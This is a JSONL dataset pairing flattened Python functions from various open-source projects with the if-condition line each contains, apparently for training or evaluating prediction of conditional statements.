{"input": "def main_loop(self) -> None: while True: try: message = self.control.get(block=False) except Empty: message = None if message == \"ABORT\": self.log.info(\"Got ABORT message, main_loop exiting...\") break if not self.all_watchers_running(): self.log.error(\"One or more watcher died, committing suicide!\") sys.exit(1) if self.all_workers_dead(): self.log.error(\"All workers have died, committing suicide!\") sys.exit(1) self.check_and_start_workers() time.sleep(0.1)", "label": "if not self . all_watchers_running ( ) :"}
{"input": "def execute_map(cls, ctx, op): (x,), device_id, xp = as_same_device( [ctx[c.key] for c in op.inputs], op.device, ret_extra=True ) axis = cls.get_arg_axis(op.axis, op.inputs[0].ndim) keepdims = op.keepdims with device(device_id): nz = xp.count_nonzero(x, axis=axis) if keepdims: slcs = [slice(None)] * op.inputs[0].ndim for ax in op.axis: slcs[ax] = np.newaxis nz = xp.asarray(nz)[tuple(slcs)] ctx[op.outputs[0].key] = nz", "label": "if keepdims :"}
{"input": "def setfilter(self, f): filter_exp = create_string_buffer(f.encode(\"ascii\")) if pcap_compile(self.pcap, byref(self.bpf_program), filter_exp, 0, -1) == -1: error(\"Could not compile filter expression %s\" % f) return False else: if pcap_setfilter(self.pcap, byref(self.bpf_program)) == -1: error(\"Could not install filter %s\" % f) return False return True", "label": "if pcap_setfilter ( self . pcap , byref ( self . bpf_program ) ) == - 1 :"}
{"input": "def find_parent_for_new_to(self, pos): \"\"\"Figure out the parent object for something at 'pos'.\"\"\" for children in self._editable_children: if children._start <= pos < children._end: return children.find_parent_for_new_to(pos) if children._start == pos and pos == children._end: return children.find_parent_for_new_to(pos) return self", "label": "if children . _start == pos and pos == children . _end :"}
{"input": "def process_events(self, events): for event in events: key = (event.ident, event.filter) if event.ident == self._force_wakeup_fd: self._force_wakeup.drain() continue receiver = self._registered[key] if event.flags & select.KQ_EV_ONESHOT: del self._registered[key] if type(receiver) is _core.Task: _core.reschedule(receiver, outcome.Value(event)) else: receiver.put_nowait(event)", "label": "if event . ident == self . _force_wakeup_fd :"}
{"input": "def test_tag(artifact_obj, sagemaker_session): tag = {\"Key\": \"foo\", \"Value\": \"bar\"} artifact_obj.set_tag(tag) while True: actual_tags = sagemaker_session.sagemaker_client.list_tags( ResourceArn=artifact_obj.artifact_arn )[\"Tags\"] if actual_tags: break time.sleep(5) # When sagemaker-client-config endpoint-url is passed as argument to hit some endpoints, # length of actual tags will be greater than 1 assert len(actual_tags) > 0 assert actual_tags[0] == tag", "label": "if actual_tags :"}
{"input": "def initialize(self) -> None: \"\"\"Move the API keys from cog stored config to core bot config if they exist.\"\"\" imgur_token = await self.config.imgur_client_id() if imgur_token is not None: if not await self.bot.get_shared_api_tokens(\"imgur\"): await self.bot.set_shared_api_tokens(\"imgur\", client_id=imgur_token) await self.config.imgur_client_id.clear()", "label": "if not await self . bot . get_shared_api_tokens ( \"imgur\" ) :"}
{"input": "def _sorted_layers(self, structure, top_layer_id): \"\"\"Return the image layers sorted\"\"\" sorted_layers = [] next_layer = top_layer_id while next_layer: sorted_layers.append(next_layer) if \"json\" not in structure[\"repolayers\"][next_layer]: # v2 break if \"parent\" not in structure[\"repolayers\"][next_layer][\"json\"]: break next_layer = structure[\"repolayers\"][next_layer][\"json\"][\"parent\"] if not next_layer: break return sorted_layers", "label": "if not next_layer :"}
{"input": "def __init__(self, bounds, channel_axis, preprocess=None): assert len(bounds) == 2 assert channel_axis in [0, 1, 2, 3] self._bounds = bounds self._channel_axis = channel_axis # Make self._preprocess to be (0,1) if possible, so that don't need # to do substract or divide. if preprocess is not None: sub, div = np.array(preprocess) if not np.any(sub): sub = 0 if np.all(div == 1): div = 1 assert (div is None) or np.all(div) self._preprocess = (sub, div) else: self._preprocess = (0, 1)", "label": "if not np . any ( sub ) :"}
{"input": "def unpickle(fname): \"\"\"Load pickled object from `fname`\"\"\" with smart_open(fname, \"rb\") as f: # Because of loading from S3 load can't be used (missing readline in smart_open) if sys.version_info > (3, 0): return _pickle.load(f, encoding=\"latin1\") else: return _pickle.loads(f.read())", "label": "if sys . version_info > ( 3 , 0 ) :"}
{"input": "def get_new_setup_py_lines(): global version with open(\"setup.py\", \"r\") as sf: current_setup = sf.readlines() for line in current_setup: if line.startswith(\"VERSION = \"): major, minor = re.findall(r\"VERSION = '(\\d+)\\.(\\d+)'\", line)[0] version = \"{}.{}\".format(major, int(minor) + 1) yield \"VERSION = '{}'\\n\".format(version) else: yield line", "label": "if line . startswith ( \"VERSION = \" ) :"}
{"input": "def make_buffers_dict(observables): \"\"\"Makes observable states in a dict.\"\"\" # Use `type(observables)` so that our output structure respects the # original dict subclass (e.g. OrderedDict). out_dict = type(observables)() for key, value in six.iteritems(observables): if value.enabled: out_dict[key] = _EnabledObservable( value, physics, random_state, self._strip_singleton_buffer_dim ) return out_dict", "label": "if value . enabled :"}
{"input": "def _callFUT(self, config_file, global_conf=None, _loader=None): import pyramid.paster old_loader = pyramid.paster.get_config_loader try: if _loader is not None: pyramid.paster.get_config_loader = _loader return pyramid.paster.setup_logging(config_file, global_conf) finally: pyramid.paster.get_config_loader = old_loader", "label": "if _loader is not None :"}
{"input": "def _csv(self, match=None, dump=None): if dump is None: dump = self._dump(match) for record in dump: row = [] for field in record: if isinstance(field, int): row.append(\"%i\" % field) elif field is None: row.append(\"\") else: row.append(\"'%s'\" % field) yield \",\".join(row)", "label": "if isinstance ( field , int ) :"}
{"input": "def preprocess_envs(args_envs): envs_map = {} for item in args_envs: i = item.find(\":\") if i != -1: key = item[:i] val = item[i + 1 :] envs_map[key] = val return envs_map", "label": "if i != - 1 :"}
{"input": "def _get_most_recent_update(self, versions): recent = None for version in versions: updated = datetime.datetime.strptime(version[\"updated\"], \"%Y-%m-%dT%H:%M:%SZ\") if not recent: recent = updated elif updated > recent: recent = updated return recent.strftime(\"%Y-%m-%dT%H:%M:%SZ\")", "label": "if not recent :"}
{"input": "def _to_string_infix(self, ostream, idx, verbose): if verbose: ostream.write(\" , \") else: if type(self._args[idx]) is _NegationExpression: ostream.write(\" - \") return True else: ostream.write(\" + \")", "label": "if type ( self . _args [ idx ] ) is _NegationExpression :"}
{"input": "def __init__(self, bert, num_classes=2, dropout=0.0, prefix=None, params=None): super(BERTClassifier, self).__init__(prefix=prefix, params=params) self.bert = bert with self.name_scope(): self.classifier = nn.HybridSequential(prefix=prefix) if dropout: self.classifier.add(nn.Dropout(rate=dropout)) self.classifier.add(nn.Dense(units=num_classes))", "label": "if dropout :"}
{"input": "def __iter__(self): for i, field in enumerate(self.fields): if field in self.readonly_fields: yield AdminReadonlyField( self.form, field, is_first=(i == 0), model_admin=self.model_admin ) else: yield AdminField(self.form, field, is_first=(i == 0))", "label": "if field in self . readonly_fields :"}
{"input": "def boolean(value): if isinstance(value, str): v = value.lower() if v in (\"1\", \"yes\", \"true\", \"on\"): return True if v in (\"0\", \"no\", \"false\", \"off\"): return False raise ValueError(value) return bool(value)", "label": "if v in ( \"1\" , \"yes\" , \"true\" , \"on\" ) :"}
{"input": "def xdir(obj, return_values=False): for attr in dir(obj): if attr[:2] != \"__\" and attr[-2:] != \"__\": if return_values: yield attr, getattr(obj, attr) else: yield attr", "label": "if attr [ : 2 ] != \"__\" and attr [ - 2 : ] != \"__\" :"}
{"input": "def get_current_stock(self): for d in self.get(\"supplied_items\"): if self.supplier_warehouse: bin = frappe.db.sql( \"select actual_qty from `tabBin` where item_code = %s and warehouse = %s\", (d.rm_item_code, self.supplier_warehouse), as_dict=1, ) d.current_stock = bin and flt(bin[0][\"actual_qty\"]) or 0", "label": "if self . supplier_warehouse :"}
{"input": "def getvars(request, excludes): getvars = request.GET.copy() excludes = excludes.split(\",\") for p in excludes: if p in getvars: del getvars[p] if len(getvars.keys()) > 0: return \"&%s\" % getvars.urlencode() else: return \"\"", "label": "if p in getvars :"}
{"input": "def read(cls, reader, dump=None): code = reader.read_u1() # Create an index of all known opcodes. if Opcode.opcodes is None: Opcode.opcodes = {} for name in globals(): klass = globals()[name] try: if name != \"Opcode\" and issubclass(klass, Opcode): Opcode.opcodes[klass.code] = klass except TypeError: pass instance = Opcode.opcodes[code].read_extra(reader, dump) if dump: reader.debug(\" \" * dump, \"%3d: %s\" % (reader.offset, instance)) return instance", "label": "if name != \"Opcode\" and issubclass ( klass , Opcode ) :"}
{"input": "def clean(self): username = self.cleaned_data.get(\"username\") password = self.cleaned_data.get(\"password\") message = ERROR_MESSAGE if username and password: self.user_cache = authenticate(username=username, password=password) if self.user_cache is None: raise ValidationError( message % {\"username\": self.username_field.verbose_name} ) elif not self.user_cache.is_active or not self.user_cache.is_staff: raise ValidationError( message % {\"username\": self.username_field.verbose_name} ) return self.cleaned_data", "label": "if self . user_cache is None :"}
{"input": "def currentLevel(self): currentStr = \"\" for stackType, stackValue in self.stackVals: if stackType == \"dict\": if isinstance(stackValue, str): currentStr += \"['\" + stackValue + \"']\" else: # numeric key... currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"listLike\": currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"getattr\": currentStr += \".__getattribute__('\" + stackValue + \"')\" else: raise Exception(f\"Cannot get attribute of type {stackType}\") return currentStr", "label": "elif stackType == \"listLike\" :"}
{"input": "def dump(self, out=sys.stdout, code2cid=None, code=None): if code2cid is None: code2cid = self.code2cid code = () for (k, v) in sorted(code2cid.iteritems()): c = code + (k,) if isinstance(v, int): out.write(\"code %r = cid %d\\n\" % (c, v)) else: self.dump(out=out, code2cid=v, code=c) return", "label": "if isinstance ( v , int ) :"}
{"input": "def __init__(self, text, menu): self.text = text self.menu = menu print(text) for i, option in enumerate(menu): menunum = i + 1 # Check to see if this line has the 'return to main menu' code match = re.search(\"0D\", option) # If it's not the return to menu line: if not match: if menunum < 10: print((\" %s) %s\" % (menunum, option))) else: print((\" %s) %s\" % (menunum, option))) else: print(\"\\n 99) Return to Main Menu\\n\") return", "label": "if menunum < 10 :"}
{"input": "def receive(self, sock): \"\"\"Receive a message on ``sock``.\"\"\" msg = None data = b\"\" recv_done = False recv_len = -1 while not recv_done: buf = sock.recv(BUFSIZE) if buf is None or len(buf) == 0: raise Exception(\"socket closed\") if recv_len == -1: recv_len = struct.unpack(\">I\", buf[:4])[0] data += buf[4:] recv_len -= len(data) else: data += buf recv_len -= len(buf) recv_done = recv_len == 0 msg = pickle.loads(data) return msg", "label": "if recv_len == - 1 :"}
{"input": "def apply_shortcuts(self): \"\"\"Apply shortcuts settings to all widgets/plugins\"\"\" toberemoved = [] for index, (qobject, context, name, default) in enumerate(self.shortcut_data): keyseq = QKeySequence(get_shortcut(context, name, default)) try: if isinstance(qobject, QAction): qobject.setShortcut(keyseq) elif isinstance(qobject, QShortcut): qobject.setKey(keyseq) except RuntimeError: # Object has been deleted toberemoved.append(index) for index in sorted(toberemoved, reverse=True): self.shortcut_data.pop(index)", "label": "elif isinstance ( qobject , QShortcut ) :"}
{"input": "def _resolved_values(self): values = [] for k, v in self.values.items() if hasattr(self.values, \"items\") else self.values: if self.mapper: if isinstance(k, util.string_types): desc = _entity_descriptor(self.mapper, k) values.extend(desc._bulk_update_tuples(v)) elif isinstance(k, attributes.QueryableAttribute): values.extend(k._bulk_update_tuples(v)) else: values.append((k, v)) else: values.append((k, v)) return values", "label": "if self . mapper :"}
{"input": "def remove_callback(self, callback, events=None): if events is None: for event in self._plugin_lifecycle_callbacks: if callback in self._plugin_lifecycle_callbacks[event]: self._plugin_lifecycle_callbacks[event].remove(callback) else: if isinstance(events, basestring): events = [events] for event in events: if callback in self._plugin_lifecycle_callbacks[event]: self._plugin_lifecycle_callbacks[event].remove(callback)", "label": "if callback in self . _plugin_lifecycle_callbacks [ event ] :"}
{"input": "def _thd_parse_volumes(self, volumes): volume_list = [] binds = {} for volume_string in volumes or []: try: bind, volume = volume_string.split(\":\", 1) except ValueError: config.error( \"Invalid volume definition for docker \" \"%s. Skipping...\" % volume_string ) continue ro = False if volume.endswith(\":ro\") or volume.endswith(\":rw\"): ro = volume[-2:] == \"ro\" volume = volume[:-3] volume_list.append(volume) binds[bind] = {\"bind\": volume, \"ro\": ro} return volume_list, binds", "label": "if volume . endswith ( \":ro\" ) or volume . endswith ( \":rw\" ) :"}
{"input": "def __init__(self, model, **kwargs): self.model = model for key, value in kwargs.items(): if not hasattr(self, key): raise TypeError( \"%s() received an invalid keyword %r\" % (self.__class__.__name__, key) ) setattr(self, key, value) self.handle_model()", "label": "if not hasattr ( self , key ) :"}
{"input": "def __getitem__(self, key): if isinstance(key, numbers.Number): l = len(self) if key >= l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) if key < 0: if key < -l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) key += l return self(key + 1) elif isinstance(key, slice): raise ValueError( self.impl.__class__.__name__ + \" object does not support slicing\" ) else: return self(key)", "label": "if key < - l :"}
{"input": "def _get_formatted(self, model, key): value = model._type(key).format(model.get(key)) if isinstance(value, bytes): value = value.decode(\"utf-8\", \"ignore\") if self.for_path: sep_repl = beets.config[\"path_sep_replace\"].as_str() for sep in (os.path.sep, os.path.altsep): if sep: value = value.replace(sep, sep_repl) return value", "label": "if sep :"}
{"input": "def publish(self, name, stat): try: topic = \"stat.%s\" % str(name) if \"subtopic\" in stat: topic += \".%d\" % stat[\"subtopic\"] stat = json.dumps(stat) logger.debug(\"Sending %s\" % stat) self.socket.send_multipart([b(topic), stat]) except zmq.ZMQError: if self.socket.closed: pass else: raise", "label": "if \"subtopic\" in stat :"}
{"input": "def logic(): while 1: yield a var = 0 out.next = 0 for i in downrange(len(a)): if a[i] == 0: continue else: for j in downrange(i - 1): if a[j] == 0: pass else: out.next = j break break", "label": "if a [ j ] == 0 :"}
{"input": "def get_abstract_models(self, appmodels): abstract_models = [] for appmodel in appmodels: abstract_models += [ abstract_model for abstract_model in appmodel.__bases__ if hasattr(abstract_model, \"_meta\") and abstract_model._meta.abstract ] abstract_models = list(set(abstract_models)) # remove duplicates return abstract_models", "label": "if hasattr ( abstract_model , \"_meta\" ) and abstract_model . _meta . abstract"}
{"input": "def _sanitize_field_name(self, field_name: str) -> str: try: if self._meta.get_field(field_name).get_internal_type() == \"ForeignKey\": if not field_name.endswith(\"_id\"): return field_name + \"_id\" except FieldDoesNotExist: pass return field_name", "label": "if not field_name . endswith ( \"_id\" ) :"}
{"input": "def find_enabled_item(self, e): x, y = e.local if ( 0 <= x < ( self.width - self.margin - self.scroll_button_size if self.scrolling else self.width ) ): h = self.font.get_linesize() i = (y - h // 2) // h + self.scroll items = self._items if 0 <= i < len(items): item = items[i] if item.enabled: return item", "label": "if 0 <= i < len ( items ) :"}
{"input": "def addColumn(self, *cols, index=None): \"Insert all *cols* into columns at *index*, or append to end of columns if *index* is None. Return first column.\" for i, col in enumerate(cols): vd.addUndo(self.columns.remove, col) if index is None: index = len(self.columns) col.recalc(self) self.columns.insert(index + i, col) Sheet.visibleCols.fget.cache_clear() return cols[0]", "label": "if index is None :"}
{"input": "def _compare_values(self, result, source): from google.protobuf.struct_pb2 import ListValue from google.protobuf.struct_pb2 import Value for found, expected in zip(result, source): self.assertIsInstance(found, ListValue) self.assertEqual(len(found.values), len(expected)) for found_cell, expected_cell in zip(found.values, expected): self.assertIsInstance(found_cell, Value) if isinstance(expected_cell, int): self.assertEqual(int(found_cell.string_value), expected_cell) else: self.assertEqual(found_cell.string_value, expected_cell)", "label": "if isinstance ( expected_cell , int ) :"}
{"input": "def _traverse(op): if topi.tag.is_broadcast(op.tag): if not op.same_as(output.op): if not op.axis: const_ops.append(op) else: ewise_ops.append(op) for tensor in op.input_tensors: if isinstance(tensor.op, tvm.te.PlaceholderOp): ewise_inputs.append((op, tensor)) else: _traverse(tensor.op) else: assert op.tag == \"dense_pack\" dense_res.append(op)", "label": "if isinstance ( tensor . op , tvm . te . PlaceholderOp ) :"}
{"input": "def update_annotation( parameters: Sequence[cst.Param], annotations: Sequence[cst.Param] ) -> List[cst.Param]: parameter_annotations = {} annotated_parameters = [] for parameter in annotations: if parameter.annotation: parameter_annotations[parameter.name.value] = parameter.annotation for parameter in parameters: key = parameter.name.value if key in parameter_annotations and ( self.overwrite_existing_annotations or not parameter.annotation ): parameter = parameter.with_changes(annotation=parameter_annotations[key]) annotated_parameters.append(parameter) return annotated_parameters", "label": "if parameter . annotation :"}
{"input": "def _modules(self, module_paths, component_name): for path in module_paths: for filename in os.listdir(path): name, ext = os.path.splitext(filename) if ext.endswith(\".py\"): root_relative_path = os.path.join(path, name)[ len(self.root_path) + len(os.path.sep) : ] module_name = \"%s.%s\" % ( component_name, root_relative_path.replace(os.path.sep, \".\"), ) yield module_name", "label": "if ext . endswith ( \".py\" ) :"}
{"input": "def run(self): # Make some objects emit lights for obj in bpy.context.scene.objects: if \"modelId\" in obj: obj_id = obj[\"modelId\"] # In the case of the lamp if obj_id in self.lights: self._make_lamp_emissive(obj, self.lights[obj_id]) # Make the windows emit light if obj_id in self.windows: self._make_window_emissive(obj) # Also make ceilings slightly emit light if obj.name.startswith(\"Ceiling#\"): self._make_ceiling_emissive(obj)", "label": "if obj_id in self . lights :"}
{"input": "def get_chart_data(self): rows = [] for row in self.data: row = frappe._dict(row) if not cint(row.bold): values = [row.range1, row.range2, row.range3, row.range4, row.range5] precision = cint(frappe.db.get_default(\"float_precision\")) or 2 rows.append({\"values\": [flt(val, precision) for val in values]}) self.chart = { \"data\": {\"labels\": self.ageing_column_labels, \"datasets\": rows}, \"type\": \"percentage\", }", "label": "if not cint ( row . bold ) :"}
{"input": "def suite(aggressive): \"\"\"Run against pep8 test suite.\"\"\" result = True path = os.path.join(os.path.dirname(__file__), \"suite\") for filename in os.listdir(path): filename = os.path.join(path, filename) if filename.endswith(\".py\"): print(filename, file=sys.stderr) result = run(filename, aggressive=aggressive) and result if result: print(GREEN + \"Okay\" + END) return result", "label": "if filename . endswith ( \".py\" ) :"}
{"input": "def list_generator(pages, num_results): result = [] # get first page items page = list(next(pages)) result += page while True: if not pages.continuation_token: break # handle num results if num_results is not None: if num_results == len(result): break page = list(next(pages)) result += page return result", "label": "if not pages . continuation_token :"}
{"input": "def _detect_too_many_digits(f): ret = [] for node in f.nodes: # each node contains a list of IR instruction for ir in node.irs: # iterate over all the variables read by the IR for read in ir.read: # if the variable is a constant if isinstance(read, Constant): # read.value can return an int or a str. Convert it to str value_as_str = read.original_value if \"00000\" in value_as_str: # Info to be printed ret.append(node) return ret", "label": "if \"00000\" in value_as_str :"}
{"input": "def write_varint(trans, n): out = [] while True: if n & ~0x7F == 0: out.append(n) break else: out.append((n & 0xFF) | 0x80) n = n >> 7 data = array.array(\"B\", out).tostring() if PY3: trans.write(data) else: trans.write(bytes(data))", "label": "if n & ~ 0x7F == 0 :"}
{"input": "def __call__(self, environ, start_response): query_string = environ.get(\"QUERY_STRING\") if \"sql_debug=1\" in query_string: import galaxy.app if galaxy.app.app.model.thread_local_log: galaxy.app.app.model.thread_local_log.log = True try: reset_request_query_counts() return self.application(environ, start_response) finally: log_request_query_counts(environ.get(\"PATH_INFO\"))", "label": "if galaxy . app . app . model . thread_local_log :"}
{"input": "def SvGetSocketInfo(socket): \"\"\"returns string to show in socket label\"\"\" global socket_data_cache ng = socket.id_data.tree_id if socket.is_output: s_id = socket.socket_id elif socket.is_linked: other = socket.other if other and hasattr(other, \"socket_id\"): s_id = other.socket_id else: return \"\" else: return \"\" if ng in socket_data_cache: if s_id in socket_data_cache[ng]: data = socket_data_cache[ng][s_id] if data: return str(len(data)) return \"\"", "label": "if data :"}
{"input": "def print_nested_help(self, args: argparse.Namespace) -> None: level = 0 parser = self.main_parser while True: if parser._subparsers is None: break if parser._subparsers._actions is None: break choices = parser._subparsers._actions[-1].choices value = getattr(args, \"level_%d\" % level) if value is None: parser.print_help() return if not choices: break if isinstance(choices, dict): parser = choices[value] else: return level += 1", "label": "if isinstance ( choices , dict ) :"}
{"input": "def tag_configure(self, *args, **keys): trace = False and not g.unitTesting if trace: g.trace(args, keys) if len(args) == 1: key = args[0] self.tags[key] = keys val = keys.get(\"foreground\") underline = keys.get(\"underline\") if val: self.configDict[key] = val if underline: self.configUnderlineDict[key] = True else: g.trace(\"oops\", args, keys)", "label": "if underline :"}
{"input": "def get_tokens_unprocessed(self, text): for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name: if self.stdlibhighlighting and value in self.stdlib_types: token = Keyword.Type elif self.c99highlighting and value in self.c99_types: token = Keyword.Type elif self.platformhighlighting and value in self.linux_types: token = Keyword.Type yield index, token, value", "label": "if self . stdlibhighlighting and value in self . stdlib_types :"}
{"input": "def materialize_as_ndarray(a): \"\"\"Convert distributed arrays to ndarrays.\"\"\" if type(a) in (list, tuple): if da is not None and any(isinstance(arr, da.Array) for arr in a): return da.compute(*a, sync=True) return tuple(np.asarray(arr) for arr in a) return np.asarray(a)", "label": "if da is not None and any ( isinstance ( arr , da . Array ) for arr in a ) :"}
{"input": "def decorated_function(*args, **kwargs): rv = f(*args, **kwargs) if isinstance(rv, flask.Response): try: result = etag if callable(result): result = result(rv) if result: rv.set_etag(result) except Exception: logging.getLogger(__name__).exception( \"Error while calculating the etag value for response {!r}\".format(rv) ) return rv", "label": "if result :"}
{"input": "def applyBC(self): \"\"\"apply boundary conditions\"\"\" deltaR = 2.0 for coord in self.pos: if coord[0] > width + deltaR: coord[0] = -deltaR if coord[0] < -deltaR: coord[0] = width + deltaR if coord[1] > height + deltaR: coord[1] = -deltaR if coord[1] < -deltaR: coord[1] = height + deltaR", "label": "if coord [ 0 ] > width + deltaR :"}
{"input": "def removeInsideIslands(self): self.CleanPath = [] cleanpath = Path(\"Path\") for path in self.NewPaths: for seg in path: inside = False for island in self.IntersectedIslands: issegin = island.isSegInside(seg) == 1 if issegin: if not seg in island: inside = True break if not inside: cleanpath.append(seg) cleanpath = cleanpath.split2contours() self.CleanPath.extend(cleanpath)", "label": "if not seg in island :"}
{"input": "def _parse_lines(self, linesource): \"\"\"Parse lines of text for functions and classes\"\"\" functions = [] classes = [] for line in linesource: if line.startswith(\"def \") and line.count(\"(\"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): functions.append(name) elif line.startswith(\"class \"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): classes.append(name) else: pass functions.sort() classes.sort() return functions, classes", "label": "if not name . startswith ( \"_\" ) :"}
{"input": "def process(self, buckets, event=None): results = [] with self.executor_factory(max_workers=2) as w: futures = {w.submit(self.process_bucket, bucket): bucket for bucket in buckets} for f in as_completed(futures): if f.result(): results.append(futures[f]) return results", "label": "if f . result ( ) :"}
{"input": "def build_polymorphic_ctypes_map(cls): # {'1': 'unified_job', '2': 'Job', '3': 'project_update', ...} mapping = {} for ct in ContentType.objects.filter(app_label=\"main\"): ct_model_class = ct.model_class() if ct_model_class and issubclass(ct_model_class, cls): mapping[ct.id] = camelcase_to_underscore(ct_model_class.__name__) return mapping", "label": "if ct_model_class and issubclass ( ct_model_class , cls ) :"}
{"input": "def expand_decodings(self, node: Node) -> None: val = node.level.result.value for decoder in self.get_decoders_for(type(val)): inst = self._config()(decoder) res = inst(val) if res is None: continue try: new_node = Node.decoding( config=self._config(), route=inst, result=res, source=node ) except DuplicateNode: continue logger.trace(\"Nesting encodings\") self.recursive_expand(new_node, False)", "label": "if res is None :"}
{"input": "def test_file(self): a = 3.33 + 4.43j b = 5.1 + 2.3j fo = None try: fo = open(test_support.TESTFN, \"wb\") print >> fo, a, b fo.close() fo = open(test_support.TESTFN, \"rb\") self.assertEqual(fo.read(), \"%s %s\\n\" % (a, b)) finally: if (fo is not None) and (not fo.closed): fo.close() test_support.unlink(test_support.TESTFN)", "label": "if ( fo is not None ) and ( not fo . closed ) :"}
{"input": "def repl(m): if m.group(2) is not None: high = int(m.group(1), 16) low = int(m.group(2), 16) if 0xD800 <= high <= 0xDBFF and 0xDC00 <= low <= 0xDFFF: cp = ((high - 0xD800) << 10) + (low - 0xDC00) + 0x10000 return unichr(cp) else: return unichr(high) + unichr(low) else: return unichr(int(m.group(1), 16))", "label": "if 0xD800 <= high <= 0xDBFF and 0xDC00 <= low <= 0xDFFF :"}
{"input": "def generate_credits(user, start_date, end_date, **kwargs): \"\"\"Generate credits data for given component.\"\"\" result = [] base = Change.objects.content() if user: base = base.filter(author=user) for language in Language.objects.filter(**kwargs).distinct().iterator(): authors = base.filter(language=language, **kwargs).authors_list( (start_date, end_date) ) if not authors: continue result.append({language.name: sorted(authors, key=lambda item: item[2])}) return result", "label": "if not authors :"}
{"input": "def history_prev(self): \"\"\"Go back in the history.\"\"\" try: if not self._history.is_browsing(): item = self._history.start(self.text().strip()) else: item = self._history.previtem() except (cmdhistory.HistoryEmptyError, cmdhistory.HistoryEndReachedError): return self.setText(item)", "label": "if not self . _history . is_browsing ( ) :"}
{"input": "def destroy(self): self._bind() for name in \"jobItems\", \"jobFileIDs\", \"files\", \"statsFiles\", \"statsFileIDs\": resource = getattr(self, name) if resource is not None: if isinstance(resource, AzureTable): resource.delete_table() elif isinstance(resource, AzureBlobContainer): resource.delete_container() else: assert False setattr(self, name, None)", "label": "elif isinstance ( resource , AzureBlobContainer ) :"}
{"input": "def user_defined_os(): if menu.options.os: if menu.options.os.lower() == \"windows\": settings.TARGET_OS = \"win\" return True elif menu.options.os.lower() == \"unix\": return True else: err_msg = \"You specified wrong value '\" + menu.options.os + \"' \" err_msg += \"as an operation system. The value, must be 'Windows' or 'Unix'.\" print(settings.print_critical_msg(err_msg)) raise SystemExit()", "label": "if menu . options . os . lower ( ) == \"windows\" :"}
{"input": "def test_save(art_warning, image_dl_estimator): try: classifier, _ = image_dl_estimator(from_logits=True) t_file = tempfile.NamedTemporaryFile() model_path = t_file.name t_file.close() filename = \"model_to_save\" classifier.save(filename, path=model_path) assert path.exists(model_path) created_model = False for file in listdir(model_path): if filename in file: created_model = True assert created_model except ARTTestException as e: art_warning(e)", "label": "if filename in file :"}
{"input": "def set_extra_data(self, extra_data=None): if extra_data and self.extra_data != extra_data: if self.extra_data and not isinstance(self.extra_data, str): self.extra_data.update(extra_data) else: self.extra_data = extra_data return True", "label": "if self . extra_data and not isinstance ( self . extra_data , str ) :"}
{"input": "def get_image_dimensions(path): \"\"\"Returns the (width, height) of an image at a given path.\"\"\" p = ImageFile.Parser() fp = open(path, \"rb\") while 1: data = fp.read(1024) if not data: break p.feed(data) if p.image: return p.image.size break fp.close() return None", "label": "if not data :"}
{"input": "def language_suffixes(): for lang in NSLocale.preferredLanguages(): while True: yield \"_\" + lang if lang != \"en\" else \"\" if \"-\" in lang: lang = lang[: lang.rfind(\"-\")] else: break yield \"\"", "label": "if \"-\" in lang :"}
{"input": "def decode_binary(binarystring): \"\"\"Decodes a binary string into it's integer value.\"\"\" n = 0 for c in binarystring: if c == \"0\": d = 0 elif c == \"1\": d = 1 else: raise ValueError(\"Not an binary number\", binarystring) # Could use ((n << 3 ) | d), but python 2.3 issues a FutureWarning. n = (n * 2) + d return n", "label": "elif c == \"1\" :"}
{"input": "def serialize_groups_for_summary(node): groups = node.osf_groups n_groups = len(groups) group_string = \"\" for index, group in enumerate(groups): if index == n_groups - 1: separator = \"\" elif index == n_groups - 2: separator = \" & \" else: separator = \", \" group_string = group_string + group.name + separator return group_string", "label": "elif index == n_groups - 2 :"}
{"input": "def _save(self, req_method, requires): conanfile = GenConanfile() for req in requires: req2, override = req if isinstance(req, tuple) else (req, False) if not req_method: conanfile.with_require(req2, override=override) else: conanfile.with_requirement(req2, override=override) self.client.save({\"conanfile.py\": conanfile}, clean_first=True)", "label": "if not req_method :"}
{"input": "def _validate_declarations( declarations: Sequence[Union[qlast.ModuleDeclaration, qlast.DDLCommand]] ) -> None: # Check that top-level declarations either use fully-qualified # names or are module blocks. for decl in declarations: if not isinstance(decl, qlast.ModuleDeclaration) and decl.name.module is None: raise EdgeQLSyntaxError( \"only fully-qualified name is allowed in \" \"top-level declaration\", context=decl.name.context, )", "label": "if not isinstance ( decl , qlast . ModuleDeclaration ) and decl . name . module is None :"}
{"input": "def assess_trial(self, trial_job_id, trial_history): _logger.info(\"assess trial %s %s\", trial_job_id, trial_history) id_ = trial_history[0] if id_ in self._killed: return AssessResult.Bad s = 0 for i, val in enumerate(trial_history): s += val if s % 11 == 1: self._killed.add(id_) _result.write(\"%d %d\\n\" % (id_, i + 1)) _result.flush() return AssessResult.Bad return AssessResult.Good", "label": "if s % 11 == 1 :"}
{"input": "def decProcess(): while 1: yield clock.posedge, reset.negedge if reset == ACTIVE_LOW: count.next = 0 else: if enable: if count == -n: count.next = n - 1 else: count.next = count - 1", "label": "if reset == ACTIVE_LOW :"}
{"input": "def activate_profile(test=True): pr = None if test: if HAS_CPROFILE: pr = cProfile.Profile() pr.enable() else: log.error(\"cProfile is not available on your platform\") return pr", "label": "if HAS_CPROFILE :"}
{"input": "def insertTestData(self, rows): for row in rows: if isinstance(row, Log): self.logs[row.id] = row.values.copy() for row in rows: if isinstance(row, LogChunk): lines = self.log_lines.setdefault(row.logid, []) # make sure there are enough slots in the list if len(lines) < row.last_line + 1: lines.append([None] * (row.last_line + 1 - len(lines))) row_lines = row.content.decode(\"utf-8\").split(\"\\n\") lines[row.first_line : row.last_line + 1] = row_lines", "label": "if isinstance ( row , LogChunk ) :"}
{"input": "def getText(self, stuff): if isinstance(stuff, BaseWrapper): stuff = stuff.item if isinstance(stuff, (Fit, TargetProfile)): val, unit = self._getValue(stuff) if val is None: return \"\" # Stick to value - 25k GJ if self.stickPrefixToValue: return \"{} {}\".format(formatAmount(val, *self.formatSpec), unit) # Stick to unit - 25 km else: return formatAmount(val, *self.formatSpec, unitName=unit) return \"\"", "label": "if self . stickPrefixToValue :"}
